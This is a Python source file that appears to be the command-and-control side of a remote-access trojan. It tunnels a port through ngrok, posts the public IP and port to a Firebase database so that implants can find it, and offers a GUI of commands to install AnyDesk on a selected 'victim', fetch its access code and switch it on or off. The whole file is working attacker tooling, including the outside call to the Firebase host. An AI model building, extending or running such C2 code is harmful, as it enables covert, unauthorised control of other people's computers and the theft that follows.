
import json
import os
import socket
import subprocess
from time import sleep
import requests
from constants import *
import threading
from os.path import dirname, abspath
from classes.host_gui import HostWithGUI

hostWithGUI = None


def startButtonOnClick(command, selectedVictim):
    """
    Called when the start button is clicked

    param 1: the command to executes
    param 2: the victim to executing the command on

    param 1 type: str
    param 2 type: Victim
    """

    processCommand(command, selectedVictim)


def processCommand(command, selectedVictim):
    """
    Processes and executes the command


    param 1: the command to executes
    param 2: the victim to executing the command on

    param 1 type: str
    param 2 type: Victim
    """

    if command == INSTALL_ANYDESK_COMMAND:
        code = selectedVictim.initialize()
        hostWithGUI.showInfo(
            "Anydesk code", f"The anydesk code for this victim is {code}")

    elif command == GET_CODE_COMMAND:
        code = selectedVictim.getCode()
        hostWithGUI.showInfo(
            "Anydesk code", f"The anydesk code for this victim is {code}")

    elif command == POWER_ON_ANYDESK_COMMAND:
        selectedVictim.powerOnAnydesk()
        hostWithGUI.showInfo(
            "ANYDESK STATE", f"Anydesk has been sucessfully powered on!")

    elif command == POWER_OFF_ANYDESK_COMMAND:
        selectedVictim.powerOffAnydesk()
        hostWithGUI.showInfo(
            "ANYDESK STATE", f"Anydesk has been sucessfully powered off!")


def runNgrok():

    # Contains the path to the ngrok exe file
    ngrok_file_path = os.path.join(os.path.dirname(__file__), "ngrok.exe")

    # Will contains the address of the ngrok server
    ngrok_url = None

    # Kills ngrok if running
    process = subprocess.run("taskkill /f /im ngrok.exe")
    # Gets the address of the ngrok server
    process = subprocess.Popen(
        f'{ngrok_file_path} tcp {PORT} --log "stdout"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    while True:
        output = process.stdout.readline()
        if not output and process.poll() is not None:
            break
        elif b'url=' in output:
            output = output.decode()
            output = output[output.index('url=tcp://') + 10: -1]
            ngrok_url = output.split(':')
            break

    ngrok_ip = socket.gethostbyname(ngrok_url[0])
    ngrok_port = ngrok_url[1]

    # Updates the ip&port on the server
    request = requests.patch("https://sc-initiation-5d638-default-rtdb.firebaseio.com/.json",
                             json={
                                 "ip": ngrok_ip,
                                 "port": ngrok_port,
                             })

    if(request.status_code != 200):
        raise Exception("Can't update ip!")

    print("Ngrok has been sucessfully launched! and the ip has been sucessfully updated!")
    print(f"IP:{ngrok_ip} PORT:{ngrok_port}")


def main():
    runNgrok()

    global hostWithGUI

    hostWithGUI = HostWithGUI(IP, PORT, [INSTALL_ANYDESK_COMMAND, GET_CODE_COMMAND,
                                         POWER_ON_ANYDESK_COMMAND, POWER_OFF_ANYDESK_COMMAND], startButtonOnClick)
    threading.Thread(target=hostWithGUI.startServer).start()

    hostWithGUI.buildGUI()


if __name__ == "__main__":
    main()
